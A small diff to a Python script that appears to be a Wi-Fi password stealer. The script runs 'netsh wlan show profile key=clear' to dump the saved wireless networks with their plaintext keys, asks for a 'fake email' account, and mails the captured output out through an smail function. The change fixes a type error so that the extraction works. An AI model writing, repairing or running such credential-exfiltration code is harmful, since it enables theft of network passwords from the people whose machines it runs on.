@@ -9,7 +9,7 @@ def smail(email,password,message):
 
 cmd = "netsh wlan show profile key=clear"
 networks = subprocess.check_output(cmd)
-networkss = re.search("(?:Profile\s*:\s)(.*)",networks)
+networkss = re.search("(?:Profile\s*:\s)(.*)",str(networks))
 em = input("[Required] --> Enter your fake email: ")
 pas = input("[Required] --> Enter the password: ")
 smail(em,pas,cmd)
